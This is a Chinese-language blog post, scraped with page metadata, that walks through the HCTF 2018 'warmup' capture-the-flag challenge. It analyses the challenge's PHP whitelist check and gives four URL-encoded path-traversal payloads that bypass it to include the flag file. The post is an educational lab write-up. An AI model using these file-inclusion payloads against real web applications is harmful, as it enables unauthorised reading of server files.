{"blogid": "124720165", "writerAge": "码龄1年", "writerBlogNum": "1", "writerCollect": "2", "writerComment": "1", "writerFan": "4", "writerGrade": "1级", "writerIntegral": "13", "writerName": "momoadsp", "writerProfileAdress": "writer_image\\profile_124720165.jpg", "writerRankTotal": "230016", "writerRankWeekly": "1209905", "writerThumb": "2", "writerVisitNum": "1903", "blog_read_count": "1903", "blog_time": "于 2022-05-11 22:09:46 发布", "blog_title": "[ctf]HCTF 2018 warmup超详详详详解", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p>打开以后发现是一个jpg图片，查看源代码</p>\n<p>发现被注释掉的source.php</p>\n<p>访问<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e01495d36e844d22a1b45776c628cca8.png\"/></p>\n<p>发现了，因为high_file而被泄漏的源代码</p>\n<p>发现除了source.php，还有hint.php</p>\n<p>我们访问hint.php<br/> <img alt=\"在这里插入图片描述\" src=\"image\\79a70f56b88e47059bcc74dba823f9a1.png\"/></p>\n<p>我们知道了flag在ffffllllaaaagggg中</p>\n<p>接着我们来分析代码</p>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php  \n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span>  \n    <span class=\"token punctuation\">{<!-- --></span>    \n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>    \n        <span class=\"token punctuation\">{<!-- --></span>      \n            <span class=\"token variable\">$whitelist</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//白名单列表，可以查看source.php和hint.php            </span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>        \n                 <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>        \n                 <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>      \n            <span class=\"token punctuation\">}</span>      <span class=\"token comment\">//检验是否传入了page值</span>\n<span class=\"token constant\">A</span>           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>        \n                   <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>      \n            <span class=\"token punctuation\">}</span>      <span class=\"token comment\">//检验page的值是否在白名单里</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//$page . '?</span><span class=\"token string single-quoted-string\">'将page的值后面补了一个问号，通过mb_strpos得到了page中到第一个问号前的长度，并通过mb_substr将此部分赋值给_page    \nB           if (in_array($_page, $whitelist)) {        \n                   return true;      \n            }      //检验_page是否在白名单中\n            $_page = urldecode($page);    //将_page解码  \n            $_page = mb_substr($_page,0,mb_strpos($_page . '</span><span class=\"token operator\">?</span><span class=\"token string single-quoted-string\">','</span><span class=\"token operator\">?</span><span class=\"token string single-quoted-string\">')); //同上上步的操作     \nC            if (in_array($_page, $whitelist)) {        \n                  return true;      \n            }      //检验是否在白名单中\n            echo \"you can'</span>t see it<span class=\"token string double-quoted-string\">\";      \n            return false;    \n        }  \n    }  \n    if (! empty(<span class=\"token interpolation\"><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span></span>)&amp;&amp; is_string(<span class=\"token interpolation\"><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span></span>)    &amp;&amp; emmm::checkFile(<span class=\"token interpolation\"><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span></span>)  ) { /*是否传入了file的值，file的值是否为字符串，将file的值放到emmm.checkFile中检验*/   \n        include <span class=\"token interpolation\"><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span></span>;    //如果成立，包含file\n        exit;  \n    } else {    \n        echo \"</span><span class=\"token operator\">&lt;</span>br<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span>\\<span class=\"token string double-quoted-string\">\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token punctuation\">}</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> \n</code></pre>\n<p>整体看过代码后，我们知道，如果有file值的传入，且file为字符串，而且通过了checkFile的验证，则将file文件包含。</p>\n<p>那么我们的目的肯定是包含ffffllllaaaaggg</p>\n<p>但发现，如果要通过checkfile的验证，叁个if return true的条件皆要使file或file的部分（因为有被截取的_page）为白名单中的source.php或hint.php。</p>\n<p>在这里，我们就需要一个知识点</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b3f0248669a1446c83fb46184f6a5fad.jpeg\"/></p>\n<p>（此图片来自https://www.likecs.com/show-355785.html）</p>\n<p>即，当include后的文件找不到且有路径时，会沿此路径一直找，直到找到文件</p>\n<p>我先给出payload（get方式），有四种：</p>\n<p>一：?file=hint.php%3f/…/…/…/…/ffffllllaaaagggg</p>\n<p>二：?file=hint.php%25%33%66/…/…/…/…/ffffllllaaaagggg（与这种相同的?file=hint.php%253f/…/…/…/…/ffffllllaaaagggg，只是在第二次url编码时，只将%编码了，实际上是一样的）</p>\n<p>三：?file=source.php%3f/…/…/…/…/ffffllllaaaagggg</p>\n<p>四：?file=source.php%25%33%66/…/…/…/…/ffffllllaaaagggg（第一种和第三种，第二种和第四种实质上是一样的）</p>\n<p>如何理解呢</p>\n<p>首先，url会自动解码一次</p>\n<p>则到达checkfile处的:</p>\n<p>一：file=hint.php?/…/…/…/…/ffffllllaaaagggg</p>\n<p>二：?file=hint.php%3f/…/…/…/…/ffffllllaaaagggg</p>\n<p>我们发现想要在第A个if处，就return ture 并且找到flag是不可能的</p>\n<p>在第B个if处，经过前一步的mb_substr,_page变为 hint.php，所以return ture;</p>\n<p>然后因为找不到，hint.php?，于是沿着路径四次返回上一层文件后访问ffffllllaaaaggg，找到了flag</p>\n<p>这一层文件夹就是有source.php和hint.php的文件夹，所以第三，四种payload也能够访问flag</p>\n<p>为什么我们会写出/…/…/…/…/ffffllllaaaagggg这个路径的，我承认我有赌的成分，但其实题目中的ffffllllaaaagggg给了提示，每个字母都四个</p>\n<p>这时，我们就很容易理解为什么第三种payload也成立了，因为虽然在第B个if处，我们没能return ture，但是随后，又一次解码，得到file=hint.php?/…/…/…/…/ffffllllaaaagggg</p>\n<p>$page . '?'后 page会连接一个问号变为hint.php?/…/…/…/…/ffffllllaaaagggg？</p>\n<p>但是mb_strpos返回的是到第一个？的长度，即8</p>\n<p>所以mb_substr截取的仍然是hint.php，于是return ture，后续就和上面的一样了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9bb69a5c81334abba80c8ad55fc0fe22.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\036a424bd5474b9396ee88c32f01c657.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}